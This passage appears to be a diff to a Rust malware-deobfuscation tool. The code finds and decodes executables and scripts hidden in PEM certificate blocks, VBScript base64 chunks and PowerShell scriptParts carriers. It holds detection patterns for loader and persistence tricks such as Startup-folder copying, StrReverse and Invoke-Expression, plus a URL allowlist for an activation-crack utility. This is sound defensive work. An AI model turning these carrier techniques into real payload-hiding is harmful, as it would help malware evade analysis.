+            let block = &text[begin..end];
+            let pem = if *allow_with_certutil {
+                extract_noisy_pem_base64_between(block, begin_marker, end_marker)
+            } else {
+                crate::handlers::certutil::extract_pem_base64(block)
+            };
+            let Some(pem) = pem else {
+                search_start = begin + begin_marker.len();
+                continue;
+            };
+            let Some(decoded) =
+                base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &pem).ok()
+            else {
+                search_start = begin + begin_marker.len();
+                continue;
+            };
+            let pe = if looks_like_pe(&decoded) {
+                decoded
+            } else if let Ok(decoded_text) = std::str::from_utf8(&decoded) {
+                if let Some(pe) = crate::handlers::certutil::decode_certutil_hex_text(decoded_text)
+                {
+                    pe
+                } else {
+                    search_start = begin + begin_marker.len();
+                    continue;
+                }
+            } else {
+                search_start = begin + begin_marker.len();
+                continue;
+            };
+            if looks_like_pe(&pe) {
+                found = Some((*display, *label, begin, end, block.len(), pem.len(), pe));
+                break;
+            }
+            search_start = begin + begin_marker.len();
+        }
+        if found.is_some() {
+            break;
+        }
+    }
+
+    let (display, label, begin, end, block_len, pem_len, pe) = found?;
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    out.push_str(&text[..begin]);
+    out.push_str(&format!(
+        "rem omitted {display} PE payload ({} base64 bytes, {} bytes recovered)",
+        pem_len,
+        pe.len()
+    ));
+    out.push_str(&text[end..]);
+    if push_recovered_pe_artifact(env, label, pe.clone()) {
+        scan_binary_input_urls(&pe, env);
+    }
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: block_len as u64,
+    });
+    Some(out)
+}
+
+fn replace_large_pem_blocks_with_existing_summary(text: &str) -> Option<String> {
+    let summary = text
+        .lines()
+        .map(str::trim)
+        .find(|line| line.starts_with("rem omitted ") && line.contains(" PE payload"))?;
+    let boundaries = [
+        (
+            "-----BEGIN NEW CERTIFICATE REQUEST-----",
+            "-----END NEW CERTIFICATE REQUEST-----",
+        ),
+        ("-----BEGIN X509 CRL-----", "-----END X509 CRL-----"),
+        ("-----BEGIN CERTIFICATE-----", "-----END CERTIFICATE-----"),
+    ];
+
+    let mut out = String::with_capacity(text.len());
+    let mut cursor = 0usize;
+    let mut changed = false;
+    while cursor < text.len() {
+        let next = boundaries
+            .iter()
+            .filter_map(|(begin, end)| {
+                text[cursor..]
+                    .find(begin)
+                    .map(|idx| (cursor + idx, *begin, *end))
+            })
+            .min_by_key(|(idx, _, _)| *idx);
+        let Some((begin_idx, begin_marker, end_marker)) = next else {
+            out.push_str(&text[cursor..]);
+            break;
+        };
+        out.push_str(&text[cursor..begin_idx]);
+        let search_after_begin = begin_idx + begin_marker.len();
+        let Some(relative_end) = text[search_after_begin..].find(end_marker) else {
+            out.push_str(&text[begin_idx..]);
+            break;
+        };
+        let end_idx = search_after_begin + relative_end + end_marker.len();
+        let block = &text[begin_idx..end_idx];
+        let payload_bytes = block.bytes().filter(|b| is_base64_carrier_byte(*b)).count();
+        if payload_bytes >= 8192 {
+            out.push_str(summary);
+            changed = true;
+            cursor = end_idx;
+            if text[cursor..].starts_with("\r\n") {
+                cursor += 2;
+            } else if text[cursor..].starts_with('\n') {
+                cursor += 1;
+            }
+            if !out.ends_with("\r\n") {
+                out.push_str("\r\n");
+            }
+        } else {
+            out.push_str(block);
+            cursor = end_idx;
+        }
+    }
+
+    changed.then(|| dedup_omission_summary_lines(&out))
+}
+
+fn summarize_large_pem_payload_blocks(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_PEM_BASE64_BYTES: usize = 8192;
+    const BOUNDARIES: &[(&str, &str, &str)] = &[
+        (
+            "NEW CERTIFICATE REQUEST",
+            "-----BEGIN NEW CERTIFICATE REQUEST-----",
+            "-----END NEW CERTIFICATE REQUEST-----",
+        ),
+        (
+            "CERTIFICATE REQUEST",
+            "-----BEGIN CERTIFICATE REQUEST-----",
+            "-----END CERTIFICATE REQUEST-----",
+        ),
+        (
+            "X509 CRL",
+            "-----BEGIN X509 CRL-----",
+            "-----END X509 CRL-----",
+        ),
+        (
+            "CERTIFICATE",
+            "-----BEGIN CERTIFICATE-----",
+            "-----END CERTIFICATE-----",
+        ),
+    ];
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut cursor = 0usize;
+    let mut changed = false;
+
+    while cursor < text.len() {
+        let next = BOUNDARIES
+            .iter()
+            .filter_map(|(display, begin, end)| {
+                text[cursor..]
+                    .find(begin)
+                    .map(|idx| (cursor + idx, *display, *begin, *end))
+            })
+            .min_by_key(|(idx, _, _, _)| *idx);
+        let Some((begin_idx, display, begin_marker, end_marker)) = next else {
+            out.push_str(&text[cursor..]);
+            break;
+        };
+
+        out.push_str(&text[cursor..begin_idx]);
+        let search_after_begin = begin_idx + begin_marker.len();
+        let Some(relative_end) = text[search_after_begin..].find(end_marker) else {
+            out.push_str(&text[begin_idx..]);
+            break;
+        };
+        let end_idx = search_after_begin + relative_end + end_marker.len();
+        let block = &text[begin_idx..end_idx];
+        let Some(pem) = extract_noisy_pem_base64_between(block, begin_marker, end_marker) else {
+            out.push_str(block);
+            cursor = end_idx;
+            continue;
+        };
+        if pem.len() < MIN_PEM_BASE64_BYTES {
+            out.push_str(block);
+            cursor = end_idx;
+            continue;
+        }
+        let Some(decoded) =
+            base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &pem).ok()
+        else {
+            out.push_str(block);
+            cursor = end_idx;
+            continue;
+        };
+        if looks_like_pe(&decoded) {
+            out.push_str(block);
+            cursor = end_idx;
+            continue;
+        }
+
+        rescue_truncated_urls(&String::from_utf8_lossy(&decoded), block.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: block.len() as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted {display} payload ({} base64 bytes, {} bytes decoded)",
+            pem.len(),
+            decoded.len()
+        ));
+        changed = true;
+        cursor = end_idx;
+    }
+
+    changed.then(|| dedup_omission_summary_lines(&out))
+}
+
+fn summarize_large_vbs_utility_carrier(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_VBS_UTILITY_BYTES: usize = 32 * 1024;
+    const CONTEXT_LINES: usize = 10;
+    if text.len() < MIN_VBS_UTILITY_BYTES {
+        return None;
+    }
+    let lower = text.to_ascii_lowercase();
+    if !lower.contains("wsman.createsession")
+        || !lower.contains("schemas.dmtf.org/wbem/wsman")
+        || !lower.contains("wscript.shell")
+    {
+        return None;
+    }
+
+    let lines: Vec<&str> = text.lines().collect();
+    if lines.len() < 256 {
+        return None;
+    }
+    let mut keep = vec![false; lines.len()];
+    for (idx, line) in lines.iter().enumerate() {
+        if is_vbs_utility_suspicious_line(line) {
+            let start = idx.saturating_sub(CONTEXT_LINES);
+            let end = (idx + CONTEXT_LINES + 1).min(lines.len());
+            for slot in &mut keep[start..end] {
+                *slot = true;
+            }
+        }
+    }
+    if !keep.iter().any(|keep_line| *keep_line) {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(16 * 1024));
+    let mut idx = 0usize;
+    let mut changed = false;
+    while idx < lines.len() {
+        if keep[idx] {
+            out.push_str(lines[idx]);
+            out.push_str("\r\n");
+            idx += 1;
+            continue;
+        }
+        let start = idx;
+        let mut bytes = 0usize;
+        while idx < lines.len() && !keep[idx] {
+            bytes = bytes.saturating_add(lines[idx].len() + 2);
+            idx += 1;
+        }
+        if bytes >= 1024 || idx - start >= 16 {
+            out.push_str(&format!(
+                "rem omitted {} WinRM/VBScript utility carrier lines ({} bytes)\r\n",
+                idx - start,
+                bytes
+            ));
+            env.traits.push(crate::traits::Trait::LineTruncated {
+                original_len: bytes as u64,
+            });
+            changed = true;
+        } else {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+                out.push_str("\r\n");
+            }
+        }
+    }
+    changed.then(|| dedup_omission_summary_lines(&out))
+}
+
+fn summarize_large_static_for_data_lists(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_ROWS: usize = 24;
+    const MIN_BYTES: usize = 4 * 1024;
+
+    let lines: Vec<&str> = text.lines().collect();
+    if lines.len() < MIN_ROWS + 2 {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(64 * 1024));
+    let mut idx = 0usize;
+    let mut changed = false;
+    while idx < lines.len() {
+        if !is_static_for_data_list_start(lines[idx]) {
+            out.push_str(lines[idx]);
+            out.push_str("\r\n");
+            idx += 1;
+            continue;
+        }
+
+        let start = idx;
+        let data_start = idx + 1;
+        let mut end = data_start;
+        let mut bytes = 0usize;
+        let mut data_rows = 0usize;
+        while end < lines.len() && !is_for_data_list_do_line(lines[end]) {
+            bytes = bytes.saturating_add(lines[end].len() + 2);
+            if is_static_for_data_row(lines[end]) {
+                data_rows += 1;
+            }
+            end += 1;
+        }
+
+        let rows = end.saturating_sub(data_start);
+        if end >= lines.len()
+            || rows < MIN_ROWS
+            || bytes < MIN_BYTES
+            || data_rows.saturating_mul(2) < rows
+        {
+            out.push_str(lines[idx]);
+            out.push_str("\r\n");
+            idx += 1;
+            continue;
+        }
+
+        out.push_str(lines[start]);
+        out.push_str("\r\n");
+        out.push_str(&format!(
+            "rem omitted {} static FOR data rows ({} bytes)\r\n",
+            rows, bytes
+        ));
+        out.push_str(lines[end]);
+        out.push_str("\r\n");
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: bytes as u64,
+        });
+        changed = true;
+        idx = end + 1;
+    }
+
+    changed.then(|| dedup_omission_summary_lines(&out))
+}
+
+fn summarize_large_public_activation_utility_report(
+    text: &str,
+    original_len: usize,
+    env: &mut Environment,
+    max_traits_per_kind: u32,
+) -> Option<Report> {
+    if !looks_like_large_public_activation_utility(text)
+        || public_activation_utility_has_external_url(text)
+    {
+        return None;
+    }
+
+    let title = text
+        .lines()
+        .find(|line| {
+            crate::util::contains_ascii_case_insensitive(line, "Microsoft_Activation_Scripts")
+        })
+        .map(str::trim)
+        .unwrap_or("title Microsoft_Activation_Scripts");
+    let data_labels = [
+        "hwiddata",
+        "ohookdata",
+        "kms38data",
+        "ksdata",
+        "changeeditiondata",
+    ]
+    .iter()
+    .filter(|label| crate::util::contains_ascii_case_insensitive(text, &format!(":{label}")))
+    .copied()
+    .collect::<Vec<_>>()
+    .join(", ");
+
+    let mut traits = std::mem::take(&mut env.traits);
+    traits.push(crate::traits::Trait::LineTruncated {
+        original_len: original_len as u64,
+    });
+    dedup_traits(&mut traits, max_traits_per_kind);
+
+    Some(Report {
+        deobfuscated: format!(
+            "{title}\r\nrem omitted large public activation utility body ({} bytes; static activation/KMS data labels: {})\r\n",
+            original_len, data_labels
+        ),
+        traits,
+        extracted_cmd: Vec::new(),
+        extracted_ps1: Vec::new(),
+        extracted_ps1_normalized: Vec::new(),
+        extracted_jscript: Vec::new(),
+        extracted_vbs: Vec::new(),
+        recovered_pe: Vec::new(),
+    })
+}
+
+fn looks_like_large_public_activation_utility(text: &str) -> bool {
+    if text.len() < 256 * 1024 {
+        return false;
+    }
+    let lower = text.to_ascii_lowercase();
+    lower.contains("microsoft_activation_scripts")
+        && (lower.contains("massgrave") || lower.contains("mass grave"))
+        && lower.contains(":hwiddata")
+        && lower.contains(":ohookdata")
+        && (lower.contains(":ksdata") || lower.contains(":kms38data"))
+}
+
+fn public_activation_utility_has_external_url(text: &str) -> bool {
+    let mut idx = 0usize;
+    while let Some(pos) = crate::util::find_ascii_case_insensitive_from(text, "http", idx) {
+        let rest = &text[pos..];
+        if !starts_with_ascii_case_insensitive(rest, "http://")
+            && !starts_with_ascii_case_insensitive(rest, "https://")
+        {
+            idx = pos + "http".len();
+            continue;
+        }
+        let end = rest
+            .find(|ch: char| ch.is_ascii_whitespace() || matches!(ch, '"' | '\'' | '<' | '>' | ')'))
+            .unwrap_or(rest.len());
+        let url = rest[..end]
+            .trim_end_matches(['.', ',', ';', ':'])
+            .to_ascii_lowercase();
+        if !public_activation_utility_url_is_allowed(&url) {
+            return true;
+        }
+        idx = pos + end.max("http".len());
+    }
+    false
+}
+
+fn public_activation_utility_url_is_allowed(url: &str) -> bool {
+    let Some((_, rest)) = url.split_once("://") else {
+        return false;
+    };
+    let host = rest
+        .split(['/', '?', '#', ':'])
+        .next()
+        .unwrap_or_default()
+        .trim_matches('.');
+    if host.is_empty() || host.contains('%') {
+        return true;
+    }
+    host == "1.1.1.1"
+        || host == "eskonr.com"
+        || host == "stackoverflow.com"
+        || host.ends_with(".stackoverflow.com")
+        || host == "techcommunity.microsoft.com"
+        || host == "mrodevicemgr.officeapps.live.com"
+        || host.ends_with(".microsoft.com")
+        || host.ends_with(".massgrave.dev")
+        || host == "massgrave.dev"
+        || (host == "github.com" && url.contains("github.com/asdcorp/"))
+}
+
+fn is_static_for_data_list_start(line: &str) -> bool {
+    let trimmed = line.trim();
+    let lower = trimmed.to_ascii_lowercase();
+    lower.starts_with("for ")
+        && lower.contains(" in (")
+        && trimmed.ends_with('(')
+        && !lower.contains("/f")
+}
+
+fn is_for_data_list_do_line(line: &str) -> bool {
+    let compact: String = line
+        .trim()
+        .bytes()
+        .filter(|byte| !byte.is_ascii_whitespace())
+        .map(char::from)
+        .collect();
+    compact.eq_ignore_ascii_case(")do(")
+}
+
+fn is_static_for_data_row(line: &str) -> bool {
+    let trimmed = line.trim();
+    trimmed.len() >= 64
+        && trimmed.matches('_').count() >= 3
+        && !trimmed.bytes().any(|byte| byte.is_ascii_whitespace())
+        && !trimmed.starts_with("::")
+        && !trimmed.to_ascii_lowercase().starts_with("rem")
+}
+
+fn summarize_vbs_base64_string_carriers(text: &str, env: &mut Environment) -> Option<String> {
+    const MIN_CHUNKS: usize = 3;
+    const MIN_TOTAL_B64: usize = 512;
+
+    let lines: Vec<&str> = text.lines().collect();
+    if lines.len() < MIN_CHUNKS {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(32 * 1024));
+    let mut idx = 0usize;
+    let mut changed = false;
+    while idx < lines.len() {
+        let Some((var, first_chunk)) = parse_vbs_base64_concat_line(lines[idx]) else {
+            out.push_str(lines[idx]);
+            out.push_str("\r\n");
+            idx += 1;
+            continue;
+        };
+
+        let start = idx;
+        let mut chunks = vec![first_chunk];
+        idx += 1;
+        while idx < lines.len() {
+            let Some((next_var, chunk)) = parse_vbs_base64_concat_line(lines[idx]) else {
+                break;
+            };
+            if !next_var.eq_ignore_ascii_case(&var) {
+                break;
+            }
+            chunks.push(chunk);
+            idx += 1;
+        }
+
+        let total_b64: usize = chunks.iter().map(String::len).sum();
+        if chunks.len() < MIN_CHUNKS || total_b64 < MIN_TOTAL_B64 {
+            for line in &lines[start..idx] {
+                out.push_str(line);
+                out.push_str("\r\n");
+            }
+            continue;
+        }
+
+        let joined = chunks.concat();
+        if let Ok(decoded) = decode_vbs_base64_carrier_text(&joined) {
+            deob_scan::scan_deob_text(&decoded, env);
+        }
+        let original_len: usize = lines[start..idx].iter().map(|line| line.len() + 2).sum();
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: original_len as u64,
+        });
+        out.push_str(&format!(
+            "rem omitted VBS base64 string carrier for {} ({} chunks, {} base64 bytes; decoded text scanned)\r\n",
+            var,
+            chunks.len(),
+            total_b64
+        ));
+        changed = true;
+    }
+
+    changed.then(|| dedup_omission_summary_lines(&out))
+}
+
+fn parse_vbs_base64_concat_line(line: &str) -> Option<(String, String)> {
+    let trimmed = line.trim_start();
+    let (lhs, rhs) = trimmed.split_once('=')?;
+    let var = lhs.trim();
+    if var.is_empty()
+        || var.len() > 64
+        || !var.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
+    {
+        return None;
+    }
+    let chunk = first_quoted_literal(rhs)?;
+    if chunk.len() < 80 || !chunk.bytes().all(is_base64_carrier_byte) {
+        return None;
+    }
+    Some((var.to_string(), chunk.to_string()))
+}
+
+fn first_quoted_literal(text: &str) -> Option<&str> {
+    let start = text.find('"')? + 1;
+    let rest = &text[start..];
+    let end = rest.find('"')?;
+    Some(&rest[..end])
+}
+
+fn decode_vbs_base64_carrier_text(encoded: &str) -> Result<String, base64::DecodeError> {
+    use base64::Engine as _;
+
+    let decoded = base64::engine::general_purpose::STANDARD.decode(encoded)?;
+    let mut text = String::from_utf8_lossy(&decoded).to_string();
+    text = text.replace("5dY", "$").replace("8LU", "'");
+    text = text.replace("'+'", "");
+    Ok(text)
+}
+
+fn is_vbs_utility_suspicious_line(line: &str) -> bool {
+    let lower = line.to_ascii_lowercase();
+    lower.contains("powershell")
+        || lower.contains(".run ")
+        || lower.contains(".run(")
+        || lower.contains(".copyfile")
+        || lower.contains("specialfolders(\"startup\")")
+        || lower.contains("specialfolders('startup')")
+        || lower.contains("strreverse(")
+        || lower.contains("startup\\")
+        || lower.contains("\\startup")
+}
+
+fn summarize_powershell_scriptparts_base64_carrier(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    const MIN_SCRIPT_PARTS: usize = 32;
+    if !crate::util::contains_ascii_case_insensitive(text, "$scriptParts")
+        || !crate::util::contains_ascii_case_insensitive(text, "Convert-Base64")
+        || !crate::util::contains_ascii_case_insensitive(text, "Invoke-Expression")
+    {
+        return None;
+    }
+
+    let mut parts: Vec<(usize, String)> = Vec::new();
+    let mut first_part_start = None;
+    let mut last_part_end = 0usize;
+    let mut cursor = 0usize;
+    for chunk in text.split_inclusive('\n') {
+        let line_start = cursor;
+        let line_end = cursor + chunk.len();
+        cursor = line_end;
+        let line = chunk.trim_end_matches(['\r', '\n']);
+        let Some((idx, b64)) = parse_powershell_scriptpart_base64_line(line) else {
+            continue;
+        };
+        first_part_start.get_or_insert(line_start);
+        last_part_end = line_end;
+        parts.push((idx, b64.to_string()));
+    }
+    if parts.len() < MIN_SCRIPT_PARTS {
+        return None;
+    }
+    parts.sort_by_key(|(idx, _)| *idx);
+    if parts
+        .iter()
+        .enumerate()
+        .any(|(expected, (idx, _))| *idx != expected)
+    {
+        return None;
+    }
+
+    let mut decoded = String::new();
+    let mut base64_bytes = 0usize;
+    for (_, b64) in &parts {
+        base64_bytes = base64_bytes.saturating_add(b64.len());
+        let bytes = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, b64).ok()?;
+        decoded.push_str(&String::from_utf8_lossy(&bytes));
+    }
+    if decoded.len() < 1024 || !looks_like_extracted_powershell(&decoded) {
+        return None;
+    }
+    push_extracted_ps1_for_later_analysis(decoded.as_bytes().to_vec(), env);
+
+    let first_part_start = first_part_start?;
+    let block_start = text[..first_part_start]
+        .rfind("# Section")
+        .unwrap_or(first_part_start);
+    let block_end = text[block_start..]
+        .find("# Verify script components")
+        .map(|rel| block_start + rel)
+        .unwrap_or(last_part_end);
+    if block_end <= block_start {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().saturating_sub(block_end - block_start) + 256);
+    out.push_str(&text[..block_start]);
+    out.push_str(&format!(
+        "rem omitted PowerShell scriptParts base64 carrier ({} parts, {} base64 bytes, {} decoded bytes; extracted PowerShell payload recorded)\r\n",
+        parts.len(),
+        base64_bytes,
+        decoded.len()
+    ));
+    out.push_str(&text[block_end..]);
+    env.traits.push(crate::traits::Trait::LineTruncated {
+        original_len: (block_end - block_start) as u64,
+    });
+    Some(out)
+}
+
+fn parse_powershell_scriptpart_base64_line(line: &str) -> Option<(usize, &str)> {
+    let trimmed = line.trim_start();
+    let rest = trimmed.strip_prefix("$part_")?;
+    let digit_len = rest
+        .bytes()
+        .position(|byte| !byte.is_ascii_digit())
+        .unwrap_or(rest.len());
+    if digit_len == 0 {
+        return None;
+    }
+    let idx = rest[..digit_len].parse().ok()?;
+    let rest = rest[digit_len..].trim_start();
+    let rest = rest.strip_prefix('=')?.trim_start();
+    if !crate::util::starts_with_ascii_case_insensitive(rest, "Convert-Base64") {
+        return None;
+    }
+    let encoded_pos = crate::util::find_ascii_case_insensitive(rest, "-EncodedText")?;
+    let after = rest[encoded_pos + "-EncodedText".len()..].trim_start();
+    let value = after.strip_prefix('"')?;
+    let end = value.find('"')?;
+    let b64 = &value[..end];
+    if b64.len() < 8 || !b64.bytes().all(is_base64_carrier_byte) {
+        return None;
+    }
+    Some((idx, b64))
+}
+
+fn dedup_omission_summary_lines(text: &str) -> String {
+    let mut seen = std::collections::HashSet::new();
+    let mut out = String::with_capacity(text.len());
+    for chunk in text.split_inclusive('\n') {
+        let trimmed = chunk.trim();
+        if trimmed.starts_with("rem omitted ") && !seen.insert(trimmed.to_string()) {
+            continue;
+        }
+        out.push_str(chunk);
+    }
+    out
+}
+
+fn coalesce_long_unresolved_percent_noise_summary_lines(
+    text: &str,
+    _env: &mut Environment,
+) -> Option<String> {
+    let mut out = String::with_capacity(text.len());
+    let mut pending = PercentNoiseSummaryRun::default();
+    let mut changed = false;
+
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        if let Some((lines, bytes, markers)) = parse_rendered_percent_noise_summary_line(body) {
+            pending.text.push_str(chunk);
+            pending.summaries += 1;
+            pending.lines += lines;
+            pending.bytes += bytes;
+            for marker in markers {
+                if !pending.markers.iter().any(|seen| seen == &marker) {
+                    pending.markers.push(marker);
+                }
+            }
+            pending.ending = ending;
+            continue;
+        }
+        flush_percent_noise_summary_run(&mut out, &mut pending, &mut changed);
+        out.push_str(chunk);
+    }
+    flush_percent_noise_summary_run(&mut out, &mut pending, &mut changed);
+
+    changed.then_some(out)
+}
+
+struct PercentNoiseSummaryRun<'a> {
+    text: String,
+    summaries: usize,
+    lines: usize,
+    bytes: usize,
+    markers: Vec<String>,
+    ending: &'a str,
+}
+
+impl Default for PercentNoiseSummaryRun<'_> {
+    fn default() -> Self {
+        Self {
+            text: String::new(),
+            summaries: 0,
+            lines: 0,
+            bytes: 0,
+            markers: Vec::new(),
+            ending: "\r\n",
+        }
+    }
+}
+
+fn flush_percent_noise_summary_run(
+    out: &mut String,
+    pending: &mut PercentNoiseSummaryRun<'_>,
+    changed: &mut bool,
+) {
+    if pending.text.is_empty() {
+        return;
+    }
+    if pending.summaries >= 2 {
+        let marker_suffix = if pending.markers.is_empty() {
+            String::new()
+        } else {
+            format!("; markers: {}", pending.markers.join(", "))
+        };
+        out.push_str(&format!(
+            "rem omitted {} long unresolved percent-noise lines ({} bytes{}){}",
+            pending.lines, pending.bytes, marker_suffix, pending.ending
+        ));
+        *changed = true;
+    } else {
+        out.push_str(&pending.text);
+    }
+    *pending = PercentNoiseSummaryRun::default();
+}
+
+fn parse_rendered_percent_noise_summary_line(line: &str) -> Option<(usize, usize, Vec<String>)> {
+    let trimmed = line.trim();
+    let rest = trimmed.strip_prefix("rem omitted ")?;
+    if let Some(bytes_text) = rest
+        .strip_prefix("long unresolved percent-noise line (")
+        .and_then(|tail| tail.strip_suffix(')'))
+    {
+        let (bytes, markers) = parse_percent_noise_summary_inner(bytes_text)?;
+        return Some((1, bytes, markers));
+    }
+
+    let (count_text, rest) = rest.split_once(' ')?;
+    let count = count_text.parse::<usize>().ok()?;
+    let bytes_text = rest
+        .strip_prefix("long unresolved percent-noise lines (")?
+        .strip_suffix(')')?;
+    let (bytes, markers) = parse_percent_noise_summary_inner(bytes_text)?;
+    Some((count, bytes, markers))
+}
+
+fn parse_percent_noise_summary_inner(inner: &str) -> Option<(usize, Vec<String>)> {
+    let (bytes_text, marker_text) = inner.strip_suffix(" bytes").map_or_else(
+        || inner.split_once(" bytes; markers: "),
+        |bytes| Some((bytes, "")),
+    )?;
+    let bytes = bytes_text.parse::<usize>().ok()?;
+    let markers = marker_text
+        .split(',')
+        .map(str::trim)
+        .filter(|marker| !marker.is_empty())
+        .map(str::to_string)
+        .collect();
+    Some((bytes, markers))
+}
+
+fn coalesce_binary_noise_summary_lines(text: &str, _env: &mut Environment) -> Option<String> {
+    let mut out = String::with_capacity(text.len());
+    let mut pending = String::new();
+    let mut pending_summaries = 0usize;
+    let mut pending_lines = 0usize;
+    let mut pending_bytes = 0usize;
+    let mut pending_ending = "\r\n";
+    let mut changed = false;
+
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        if let Some((lines, bytes)) = parse_rendered_binary_noise_summary_line(body) {
+            pending.push_str(chunk);
+            pending_summaries += 1;
+            pending_lines += lines;
+            pending_bytes += bytes;
+            pending_ending = ending;
+            continue;
+        }
+        flush_binary_noise_summary_run(
+            &mut out,
+            &mut pending,
+            &mut pending_summaries,
+            &mut pending_lines,
+            &mut pending_bytes,
+            pending_ending,
+            &mut changed,
+        );
+        out.push_str(chunk);
+    }
+    flush_binary_noise_summary_run(
+        &mut out,
+        &mut pending,
+        &mut pending_summaries,
+        &mut pending_lines,
+        &mut pending_bytes,
+        pending_ending,
+        &mut changed,
+    );
+
+    changed.then_some(out)
+}
+
+fn flush_binary_noise_summary_run(
+    out: &mut String,
+    pending: &mut String,
+    pending_summaries: &mut usize,
+    pending_lines: &mut usize,
+    pending_bytes: &mut usize,
+    ending: &str,
+    changed: &mut bool,
+) {
+    if pending.is_empty() {
+        return;
+    }
+    if *pending_summaries >= 2 {
+        out.push_str(&format!(
+            "rem omitted {} binary-looking lines ({} bytes){}",
+            *pending_lines, *pending_bytes, ending
+        ));
+        *changed = true;
+    } else {
+        out.push_str(pending);
+    }
+    pending.clear();
+    *pending_summaries = 0;
+    *pending_lines = 0;
+    *pending_bytes = 0;
+}
+
+fn parse_rendered_binary_noise_summary_line(line: &str) -> Option<(usize, usize)> {
+    let trimmed = line.trim();
+    let rest = trimmed.strip_prefix("rem omitted ")?;
+    let (count_text, rest) = rest.split_once(' ')?;
+    let count = count_text.parse::<usize>().ok()?;
+    let rest = rest.strip_prefix("residual ").unwrap_or(rest);
+    let bytes_text = rest
+        .strip_prefix("binary-looking lines (")?
+        .strip_suffix(" bytes)")?;
+    let bytes = bytes_text.parse::<usize>().ok()?;
+    Some((count, bytes))
+}
+
+fn summarize_dense_unresolved_control_flow_noise_lines(
+    text: &str,
+    env: &mut Environment,
+) -> Option<String> {
+    let mut noise_lines = 0usize;
+    let mut noise_bytes = 0usize;
+    let mut branch_lines = 0usize;
+    let mut nul_sink_lines = 0usize;
+
+    for line in text.lines() {
+        match rendered_unresolved_control_flow_noise_kind(line) {
+            Some(RenderedControlFlowNoiseKind::Branch) => {
+                noise_lines += 1;
+                noise_bytes += line.len();
+                branch_lines += 1;
+            }
+            Some(RenderedControlFlowNoiseKind::NulSink) => {
+                noise_lines += 1;
+                noise_bytes += line.len();
+                nul_sink_lines += 1;
+            }
+            None => {}
+        }
+    }
+
+    if noise_lines < 48 || noise_bytes < 1024 || branch_lines < 16 || nul_sink_lines < 16 {
+        return None;
+    }
+
+    let mut out = String::with_capacity(text.len().min(512 * 1024));
+    let mut omitted_lines = 0usize;
+    let mut omitted_bytes = 0usize;
+    let mut summary_inserted = false;
+
+    for chunk in text.split_inclusive('\n') {
+        let (body, ending) = split_line_ending(chunk);
+        if rendered_unresolved_control_flow_noise_kind(body).is_some() {
+            if !summary_inserted {
+                out.push_str(&format!(
+                    "rem omitted {noise_lines} dense unresolved control-flow noise lines ({noise_bytes} bytes){ending}"
+                ));
+                summary_inserted = true;
+            }
+            rescue_truncated_urls(body, body.len(), env);
+            omitted_lines += 1;
+            omitted_bytes += chunk.len();
+            continue;
+        }
+        out.push_str(chunk);
+    }
+
+    if omitted_lines > 0 {
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: omitted_bytes as u64,
+        });
+        Some(out)
+    } else {
+        None
+    }
+}
+
+#[derive(Clone, Copy)]
+enum RenderedControlFlowNoiseKind {
+    Branch,
+    NulSink,
+}
+
+fn rendered_unresolved_control_flow_noise_kind(line: &str) -> Option<RenderedControlFlowNoiseKind> {
+    if is_randomish_rendered_label_definition(line)
+        || rendered_goto_randomish_label_target(line).is_some()
+        || rendered_true_if_goto_randomish_label_target(line).is_some()
+    {
+        return Some(RenderedControlFlowNoiseKind::Branch);
+    }
+    if is_rendered_errorlevel_echo_to_nul_noise(line) || is_rendered_echo_to_nul_noise(line) {
+        return Some(RenderedControlFlowNoiseKind::NulSink);
+    }
+    None
+}
+
+fn is_randomish_rendered_label_definition(line: &str) -> bool {
+    let trimmed = line.trim();
+    if trimmed.starts_with("::") {
+        return false;
+    }
+    let Some(label) = trimmed.strip_prefix(':') else {
+        return false;
+    };
+    is_randomish_rendered_label_name(label)
+}
+
+fn rendered_goto_randomish_label_target(line: &str) -> Option<&str> {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let rest = strip_ascii_case_insensitive_keyword(trimmed, "goto")?.trim_start();
+    let target = rest.trim_start_matches(':').split_whitespace().next()?;
+    is_randomish_rendered_label_name(target).then_some(target)
+}
+
+fn rendered_true_if_goto_randomish_label_target(line: &str) -> Option<&str> {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let rest = strip_ascii_case_insensitive_keyword(trimmed, "if")?.trim_start();
+    let rest = rest.strip_prefix("1==1")?.trim_start();
+    rendered_goto_randomish_label_target(rest)
+}
+
+fn is_rendered_errorlevel_echo_to_nul_noise(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let rest = match strip_ascii_case_insensitive_keyword(trimmed, "if") {
+        Some(rest) => rest.trim_start(),
+        None => return false,
+    };
+    let lower = rest.to_ascii_lowercase();
+    if !lower.starts_with("%errorlevel%") || !lower.ends_with("2>nul") || !lower.contains(" echo ")
+    {
+        return false;
+    }
+    let Some((_, payload)) = split_ascii_case_insensitive_once(rest, " echo ") else {
+        return false;
+    };
+    let payload = payload
+        .trim_end()
+        .strip_suffix("2>nul")
+        .unwrap_or(payload)
+        .trim();
+    is_short_rendered_nul_sink_noise_payload(payload)
+}
+
+fn is_rendered_echo_to_nul_noise(line: &str) -> bool {
+    let trimmed = line.trim_start().trim_start_matches('@').trim_start();
+    let payload = match strip_ascii_case_insensitive_keyword(trimmed, "echo") {
